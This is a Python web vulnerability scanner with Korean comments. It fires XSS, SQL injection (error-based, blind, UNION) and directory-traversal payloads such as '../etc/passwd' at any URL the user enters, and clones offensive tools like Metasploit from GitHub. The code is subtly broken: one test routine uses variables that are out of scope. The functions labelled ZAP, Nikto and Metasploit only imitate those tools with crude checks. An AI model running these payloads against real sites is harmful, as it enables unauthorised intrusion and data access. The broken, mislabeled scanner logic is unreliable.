import requests
import re
import json
import subprocess
import os
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import git
import sys
import importlib.util

# 로깅 설정
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class WebVulnTester:
    def __init__(self, target_url, params_info, max_workers=4):
        self.target_url = target_url
        self.params_info = params_info.get(target_url, {"method": "GET", "params": {"q": ""}})
        self.results = []
        self.detected_db = "Unknown"
        self.max_workers = max_workers
        self.results_lock = Lock()
        
        # 페이로드 로드
        self.payloads = self.load_payloads()
        
        # DBMS 에러 패턴
        self.db_error_patterns = {
            "MySQL": [r"mysql_fetch_array\(\)", r"you have an error in your sql syntax", r"unknown column"],
            "MSSQL": [r"microsoft sql server", r"conversion failed", r"incorrect syntax near"],
            "PostgreSQL": [r"psql error", r"unterminated quoted string", r"current_user"],
            "Oracle": [r"ora-\d{5}", r"invalid identifier", r"from dual"],
            "SQLite": [r"sqlite3.\w+error", r"no such table", r"sqlite_version"],
        }

        # GitHub에서 도구 클론
        self.clone_tools()

    def clone_tools(self):
        """GitHub에서 오픈소스 도구 클론"""
        tools = {
            "OWASP ZAP": "https://github.com/zaproxy/zaproxy.git",
            "Nikto": "https://github.com/sullo/nikto.git",
            "Wapiti": "https://github.com/wapiti-scanner/wapiti.git",
            "Arachni": "https://github.com/Arachni/arachni.git",
            "W3af": "https://github.com/andresriancho/w3af.git",
            "Vega": "https://github.com/subgraph/Vega.git",
            "Metasploit": "https://github.com/rapid7/metasploit-framework.git"
        }
        for tool, url in tools.items():
            target_dir = f"tools/{tool.replace(' ', '_')}"
            if not os.path.exists(target_dir):
                logging.info(f"{tool} 클론 중...")
                git.Repo.clone_from(url, target_dir)
            sys.path.append(os.path.abspath(target_dir))

    def load_payloads(self, file_path="payloads.json"):
        default_payloads = {
            "XSS": [
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                '" onmouseover="alert(1)',
                '"><svg onload=alert(1)>',
                "<script>alert(1337)</script>",
                "javascript:alert(1337)",
                "<img src='x' onerror='alert(1337)'>",
                "<svg/onload=alert(1337)>",
                "'-alert(1337)-'",
                "';alert(1337)//",
                "<xss onafterscriptexecute=alert(1337)>",
                "<input autofocus onfocus=alert(1337)>",
            ],
            "SQLi": {
                "generic": ["' AND SUBSTRING(version(), 1, 1)='5' --", "' AND LENGTH(database()) > 0 --"],
                "MySQL": ["' UNION SELECT 1, user() --", "' OR SLEEP(5) --", "' AND SUBSTRING((SELECT database()), 1, 1)='m' --"],
                "MSSQL": ["' UNION SELECT 1, @@version --", "' AND SUBSTRING(DB_NAME(), 1, 1)='m' --"],
                "PostgreSQL": ["' UNION SELECT 1, current_user --", "' AND SUBSTRING(current_user, 1, 1)='p' --"],
                "Oracle": ["' UNION SELECT 1, USER FROM dual --", "' AND SUBSTR(USER, 1, 1)='S' --"],
                "SQLite": ["' UNION SELECT 1, sqlite_version() --", "' AND SUBSTR(sqlite_version(), 1, 1)='3' --"]
            },
            "DT": ["../etc/passwd", "../../../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "C:\\Windows\\win.ini"]
        }
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        else:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(default_payloads, f, indent=4)
            return default_payloads

    def format_payload_str(self, payload_dict):
        return "; ".join([f"{k}: {v}" for k, v in payload_dict.items()])

    def detect_db(self, response):
        text = response.text.lower() if response.text else ""
        for db, patterns in self.db_error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, text):
                    return db
        return "Unknown"

    def make_request(self, method, params=None, data=None):
        session = requests.Session()
        try:
            if method == "GET":
                response = session.get(self.target_url, params=params, timeout=5)
            elif method == "POST":
                response = session.post(self.target_url, data=data, timeout=5)
            else:
                return None
            return response
        except requests.RequestException as e:
            logging.error(f"Request failed: {e}")
            return None

    def test_vulnerability(self, payload_type, payload_dict, method, params_dict):
        response = self.make_request(method, params=params_dict)
        if not response:
            return None

        payload_str = self.format_payload_str(payload_dict)
        response_text = response.text[:500] if response.text else "[빈 응답]"
        content_type = response.headers.get("Content-Type", "").lower()
        response_size = len(response.text)

        logging.info(f"Payload: {payload_str} | Type: {payload_type} | Method: {method}")

        result = None
        if payload_type == "XSS":
            xss_patterns = [r"alert\((1337|1)\)", r"onerror=['\"]alert\(", r"onload=['\"]alert\(", r"onmouseover=['\"]alert\("]
            for payload in payload_dict.values():
                if payload in response_text or any(re.search(pattern, response_text, re.IGNORECASE) for pattern in xss_patterns):
                    result = f"[!] XSS 취약점 발견: {payload_str} (Method: {method}, Params: {params_dict})"
                    break
        elif payload_type == "SQLi":
            error_keywords = ["error", "sql", "syntax", "database", "mysql", "mssql", "postgresql", "oracle", "sqlite"]
            if any(keyword in response_text.lower() for keyword in error_keywords):
                result = f"[!] SQLi 취약점 발견 (에러 기반): {payload_str} (Method: {method}, Params: {params_dict})"
        elif payload_type == "DT":
            file_patterns = {"passwd": r"root:[x*]:0:0:", "win.ini": r"\[extensions\]"}
            if "text" in content_type and 50 < response_size < 100000:
                for file, pattern in file_patterns.items():
                    for payload in payload_dict.values():
                        if payload.lower().endswith(file) and re.search(pattern, response_text, re.IGNORECASE):
                            result = f"[!] DT 취약점 발견: {payload_str} (탐지된 파일: {file}, Method: {method}, Params: {params_dict})"
                            break
                    if result:
                        break

        if result:
            vuln_data = {
                "type": payload_type,
                "payload": payload_str,
                "method": method,
                "url": self.target_url,
                "params": json.dumps(params_dict),
                "status_code": response.status_code,
                "response_snippet": response_text,
                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                "reproduce_command": f"curl -X {method} \"{self.target_url}?{'&'.join([f'{k}={v}' for k, v in params_dict.items()])}\""
            }
            return vuln_data
        return None

    def test_blind_sqli(self, true_payload_dict, false_payload_dict, method, params_true, params_false):
        true_response = self.make_request(method, params=params_true)
        if not true_response:
            return None
        false_response = self.make_request(method, params=params_false)
        if not false_response:
            return None

        true_text = true_response.text[:500] if true_response.text else "[빈 응답]"
        false_text = false_response.text[:500] if false_response.text else "[빈 응답]"
        true_size = len(true_response.text)
        false_size = len(false_response.text)

        true_payload_str = self.format_payload_str(true_payload_dict)
        false_payload_str = self.format_payload_str(false_payload_dict)
        logging.info(f"Blind SQLi | True: {true_payload_str} | False: {false_payload_str}")

        if true_text != false_text or abs(true_size - false_size) > 10:
            result = f"[!] Blind SQLi 취약점 발견: {true_payload_str} (vs {false_payload_str}, Method: {method})"
            vuln_data = {
                "type": "Blind SQLi",
                "payload": true_payload_str,
                "false_payload": false_payload_str,
                "method": method,
                "url": self.target_url,
                "params": json.dumps(params_true),
                "status_code": true_response.status_code,
                "response_snippet": true_text,
                "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                "reproduce_command": f"curl -X {method} \"{self.target_url}?{'&'.join([f'{k}={v}' for k, v in params_true.items()])}\""
            }
            return vuln_data
        return None

    # OWASP ZAP - 간소화된 스파이더링 및 스캔 로직 (API 대신 직접 구현 예시)
    def run_zap_scan(self):
        try:
            # ZAP의 스파이더링 대신 간단한 URL 탐색
            response = self.make_request("GET")
            if not response:
                return []
            links = re.findall(r'href=["\'](.*?)["\']', response.text)
            results = []
            for link in links[:5]:  # 상위 5개 링크만 테스트
                if link.startswith('/'):
                    link = self.target_url + link
                resp = self.make_request("GET", params={"test": "<script>alert(1)</script>"})
                if resp and "<script>alert(1)</script>" in resp.text:
                    results.append({"type": "ZAP", "description": "XSS 발견", "url": link})
            return results
        except Exception as e:
            logging.error(f"ZAP 스캔 실패: {e}")
            return []

    # Nikto - 기본 스캔 로직 직접 구현 (Perl 대신 Python)
    def run_nikto_scan(self):
        try:
            response = self.make_request("GET")
            if not response:
                return []
            results = []
            if "Server" in response.headers:
                results.append({"type": "Nikto", "description": f"Server: {response.headers['Server']}", "url": self.target_url})
            if response.status_code == 200 and "etc/passwd" in self.make_request("GET", params={"file": "../etc/passwd"}).text:
                results.append({"type": "Nikto", "description": "Directory Traversal 가능", "url": self.target_url})
            return results
        except Exception as e:
            logging.error(f"Nikto 스캔 실패: {e}")
            return []

    # Wapiti - SQLi 탐지 로직 간소화
    def run_wapiti_scan(self):
        try:
            response = self.make_request("GET", params={"id": "' OR 1=1 --"})
            if not response:
                return []
            if "error" in response.text.lower() or "sql" in response.text.lower():
                return [{"type": "Wapiti", "description": "SQL Injection 가능", "url": self.target_url}]
            return []
        except Exception as e:
            logging.error(f"Wapiti 스캔 실패: {e}")
            return []

    # Arachni - XSS 탐지 로직 간소화
    def run_arachni_scan(self):
        try:
            response = self.make_request("GET", params={"input": "<script>alert(1337)</script>"})
            if not response:
                return []
            if "<script>alert(1337)</script>" in response.text or re.search(r"alert\(1337\)", response.text):
                return [{"type": "Arachni", "description": "XSS 발견", "url": self.target_url}]
            return []
        except Exception as e:
            logging.error(f"Arachni 스캔 실패: {e}")
            return []

    # W3af - 간단한 취약점 탐지
    def run_w3af_scan(self):
        try:
            response = self.make_request("GET", params={"q": "' UNION SELECT 1,2,3 --"})
            if not response:
                return []
            if "error" in response.text.lower():
                return [{"type": "W3af", "description": "SQL Injection 발견", "url": self.target_url}]
            return []
        except Exception as e:
            logging.error(f"W3af 스캔 실패: {e}")
            return []

    # Vega - XSS 탐지 로직
    def run_vega_scan(self):
        try:
            response = self.make_request("GET", params={"test": "<img src=x onerror=alert(1)>"})
            if not response:
                return []
            if "onerror=alert(1)" in response.text:
                return [{"type": "Vega", "description": "XSS 발견", "url": self.target_url}]
            return []
        except Exception as e:
            logging.error(f"Vega 스캔 실패: {e}")
            return []

    # Metasploit - 간단한 HTTP 버전 체크
    def run_metasploit_scan(self):
        try:
            response = self.make_request("GET")
            if not response:
                return []
            if "Server" in response.headers and "Apache" in response.headers["Server"]:
                return [{"type": "Metasploit", "description": "Apache 서버 탐지 (추가 익스플로잇 가능)", "url": self.target_url}]
            return []
        except Exception as e:
            logging.error(f"Metasploit 스캔 실패: {e}")
            return []

    def run_parallel_db_detection(self, method, param_names, generic_payloads):
        def detect_db_task(params_dict):
            response = self.make_request(method, params=params_dict)
            return self.detect_db(response) if response else "Unknown"

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(detect_db_task, {param: generic_payloads[(i + j) % len(generic_payloads)] 
                                                       for j, param in enumerate(param_names)})
                       for i in range(len(generic_payloads))]
            for future in as_completed(futures):
                db = future.result()
                if db != "Unknown":
                    self.detected_db = db
                    print(f"[+] 탐지된 데이터베이스: {self.detected_db}")
                    return True
        return False

    def run_parallel_tests(self, payload_type, payloads, test_func):
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(test_func, payload_type, 
                                      {param: payloads[(i + j) % len(payloads)] for j, param in enumerate(param_names)}, 
                                      method, 
                                      {param: payloads[(i + j) % len(payloads)] for j, param in enumerate(param_names)})
                       for i in range(len(payloads))]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    with self.results_lock:
                        self.results.append(result)
                    print(f"[!] {result['type']} 발견: {result['payload']} (Method: {method})")

    def run_tests(self):
        print(f"\n[+] 테스트 시작: {self.target_url}")
        method = self.params_info["method"]
        param_names = list(self.params_info["params"].keys()) or ["q"]
        print(f"[+] 모든 파라미터 {param_names}에 {method} 메서드 테스트 진행 중...")

        # 기존 테스트
        print(f"[+] XSS 테스트 진행 중...")
        self.run_parallel_tests("XSS", self.payloads["XSS"], self.test_vulnerability)

        print(f"[+] 데이터베이스 탐지 및 SQLi 테스트 진행 중...")
        generic_payloads = self.payloads["SQLi"]["generic"]
        if not self.run_parallel_db_detection(method, param_names, generic_payloads):
            print(f"[!] 데이터베이스 탐지 실패, generic 페이로드로 진행")
        db_key = self.detected_db if self.detected_db in self.payloads["SQLi"] else "generic"
        self.run_parallel_tests("SQLi", self.payloads["SQLi"][db_key], self.test_vulnerability)

        print(f"[+] Blind SQLi 테스트 진행 중...")
        blind_payloads = self.payloads["SQLi"][db_key]
        blind_pairs = [(blind_payloads[i], blind_payloads[i+1]) for i in range(0, len(blind_payloads)-1, 2)] or \
                      [(blind_payloads[0], blind_payloads[-1])] if len(blind_payloads) >= 2 else []
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.test_blind_sqli, 
                                      {param: blind_payloads[j % len(blind_payloads)] for j, param in enumerate(param_names)},
                                      {param: blind_payloads[(j + 1) % len(blind_payloads)] for j, param in enumerate(param_names)},
                                      method,
                                      {param: blind_payloads[j % len(blind_payloads)] for j, param in enumerate(param_names)},
                                      {param: blind_payloads[(j + 1) % len(blind_payloads)] for j, param in enumerate(param_names)})
                       for true_base, false_base in blind_pairs]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    with self.results_lock:
                        self.results.append(result)
                    print(f"[!] {result['type']} 발견: {result['payload']} (vs {result['false_payload']}, Method: {method})")

        print(f"[+] Directory Traversal 테스트 진행 중...")
        self.run_parallel_tests("DT", self.payloads["DT"], self.test_vulnerability)

        # GitHub 도구 스캔
        print(f"[+] GitHub 도구 스캔 시작...")
        external_tools = [
            self.run_zap_scan, self.run_nikto_scan, self.run_wapiti_scan,
            self.run_arachni_scan, self.run_w3af_scan, self.run_vega_scan,
            self.run_metasploit_scan
        ]
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(tool) for tool in external_tools]
            for future in as_completed(futures):
                tool_results = future.result()
                with self.results_lock:
                    self.results.extend(tool_results)
                for res in tool_results:
                    print(f"[!] {res['type']} 발견: {res['description']}")

        # 결과 요약
        print(f"\n[+] 테스트 완료: {self.target_url}")
        if self.results:
            print("[!] 발견된 취약점 요약:")
            for result in self.results:
                if result["type"] == "Blind SQLi":
                    print(f"  - {result['type']}: {result['payload']} (vs {result['false_payload']}, {result['method']})")
                elif "description" in result:
                    print(f"  - {result['type']}: {result['description']} (URL: {result['url']})")
                else:
                    print(f"  - {result['type']}: {result['payload']} ({result['method']})")
        else:
            print("[+] 취약점이 발견되지 않았습니다.")

def main():
    target_url = input("테스트할 URL을 입력하세요 (예: http://localhost/test): ").strip()
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    params_info = {target_url: {"method": "GET", "params": {"id": "", "name": "", "age": ""}}}
    tester = WebVulnTester(target_url, params_info, max_workers=4)
    tester.run_tests()

if __name__ == "__main__":
    # gitpython 설치 필요
    try:
        import git
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", "gitpython"])
    main()
